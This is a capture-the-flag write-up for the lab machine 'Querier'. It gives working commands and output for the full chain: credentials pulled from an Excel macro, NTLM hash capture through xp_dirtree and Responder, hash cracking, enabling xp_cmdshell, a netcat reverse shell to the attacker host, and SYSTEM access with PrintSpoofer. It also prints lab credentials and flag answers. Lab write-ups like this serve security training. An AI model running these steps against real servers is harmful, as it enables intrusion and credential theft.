# CTF Writeup: Querier

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sSCV -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.129.35.214 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-09 05:56 -0500
Nmap scan report for 10.129.35.214
Host is up (0.029s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.35.214:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.35.214:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-09T10:52:52
|_Not valid after:  2056-01-09T10:52:52
|_ssl-date: 2026-01-09T10:57:46+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-09T10:57:38
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.85 seconds
```

Enumerated Shares anonymously worked.

```
smbclient -L \\\\10.129.35.214 
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.35.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Accessed the "Reports" Share anonymously.

```
smbclient \\\\10.129.35.214/Reports
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \>
```

Retrieved the .xlsm file and unzipped it on my local machine.

```
unzip 'Currency Volume report.xlsm' 
Archive:  Currency Volume report.xlsm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/vbaProject.bin       
  inflating: docProps/core.xml       
  inflating: docProps/app.xml
```

Retrieved an username "Luis" in core.xml

```
cat core.xml                       
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:creator>Luis</dc:creator><cp:lastModifiedBy>Luis</cp:lastModifiedBy><dcterms:created xsi:type="dcterms:W3CDTF">2019-01-21T20:38:56Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2019-01-27T22:21:34Z</dcterms:modified></cp:coreProperties>
```

Performed forensics using "strings" tool and discovered an Microsoft SQL Database Credentials reporting:PcwTWTHRwryjc$c6

```
strings vbaProject.bin               
 macro to pull data for client volume reports
n.Conn]
Open 
rver=<
SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

Connected to the MSSQL Database utilizing the credentials we found.

```
impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.129.35.214 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)>
```

Utilized xp_dirtree in order to execute system commands and enumerated an interesting user called "mssql-svc".

```
SQL (QUERIER\reporting  reporting@volume)> EXEC xp_dirtree 'C:\Users', 1,0;
subdirectory    depth   
-------------   -----   
Administrator       1   
All Users           1   
Default             1   
Default User        1   
mssql-svc           1   
Public              1
```

## Initial Access

We can try and do an "SMB Relay" Attack which is an MITM Attack.

1. We ask our victim machine to connect to a fake share on our attacking machine.
2. On our attacking machine we listen for the connection with Reponsder.
3. When a connection comes Responder will ask for authentication through NTLM.
4. The victim machine will then provide its NTLM hash to authenticate.
5. We capture that hash, take it offline and hope to crack it.

We set up this attack by first confirming the Responder.conf file is correct, the file is located at /etc/responder/Responder.conf

Within this file, we want to make sure SMB is set to yes. Once done we can boot up Responder with the following command.

```
Responder -I tun0
```

With Responder running we go back to the mssql database and run the following code, telling the victim computer to reach out to our fake share (which doesn’t exist).

```
EXEC xp_dirtree '//10.10.14.161/fake_share/', 1, 0;
```

With that, Responder should trigger and show you the hash for the user mssql-svc.

```
[SMB] NTLMv2-SSP Client   : 10.129.35.214
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:73ea9c64860035f6:C2971393F0AACFF20B7DEB6CA3477BE7:010100000000000080E0E9E83A81DC01915EDB0F60A174460000000002000800300057004600470001001E00570049004E002D0030004A00570036003900380036003800470034004A0004003400570049004E002D0030004A00570036003900380036003800470034004A002E0030005700460047002E004C004F00430041004C000300140030005700460047002E004C004F00430041004C000500140030005700460047002E004C004F00430041004C000700080080E0E9E83A81DC0106000400020000000800300030000000000000000000000000300000FF562B8343646B35AA95CD77083FA7B6FC596E21A6FDC1C4E5EDA97CDDAADC970A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310036003100000000000000000000000000
```

I saved this hash into a text file and ran it through hashcat with -m 5600 for NTLM.

```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt 
```

Retrieved the password for the msql-svc user.

```
mssql-svc:corporate568
```

Connected to the mssql database with those credentials.

```
impacket-mssqlclient mssql-svc:'corporate568'@10.129.35.214 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)>
```

The current user is Administrator, which means we can now utilize xp_cmdshell to execute system commands on the target system.
```
SQL (QUERIER\mssql-svc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1
```

When trying to execute xp_cmdshell we get an error, since it's disabled. But we can utilize sp_configure to activate it.

```
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell
ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

Enabled xp_cmdshell

```
-- Step 1: Show advanced options (required)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;


-- Step 2: Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;


-- Step 3: Verify it's enabled
EXEC sp_configure 'xp_cmdshell';
-- Should show: config_value = 1, run_value = 1
```

Started up an listener on port 21.

```
nc -lvnp 21
```

Ran the following command in order to access my local smb share in which I execute the nc.exe binary stored inside it remotely from the target to get an reverse connection my listener.

```
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell '\\10.10.14.161\htb\nc.exe -e cmd.exe 10.10.14.161 21';
```

Retrieved RCE as user "mssql-svc".

```
nc -lvnp 21
listening on [any] 21 ...
connect to [10.10.14.161] from (UNKNOWN) [10.129.35.214] 49684
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc
```

Retrieved user.txt in C:\Users\mssql-svc\Desktop.

```
2905ce647c8029a2649eb50343f4806b
```

Enumerated privileges of mssql-svc user.

```
C:\Users\mssql-svc>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Since "SeImpersonatePrivilege" is enabled, we can utilize a lot of exploits. But let's first enumerate further.

Enumerated system information.

```
C:\Users\mssql-svc>systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"
Host Name:                 QUERIER
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
System Type:               x64-based PC
Hotfix(s):                 5 Hotfix(s) Installed.
Network Card(s):           1 NIC(s) Installed.
```

## Privilege Escalation

Downloaded PrintSpoofer.exe onto the target system and ran it. Gained RCE as user "NT AUTHORITY\SYSTEM".

```
PS C:\Temp> .\PrintSpoofer.exe -i -c cmd.exe
.\PrintSpoofer.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
957ed4c36ced185512350657efe8ede8
